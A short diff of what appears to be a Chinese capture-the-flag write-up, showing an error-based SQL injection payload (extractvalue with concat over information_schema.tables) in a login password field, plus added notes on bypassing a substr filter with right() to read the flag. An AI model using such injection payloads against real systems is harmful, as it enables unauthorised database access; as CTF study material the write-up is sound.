@@ -351,3 +351,5 @@ echo serialize($flag);
 ```http
 ?username=1&password=2'or(extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23
 ```
+substr被过滤了，我们这里用一个小技巧
+right函数：从右边显示内容，这样可以得到另外的flag
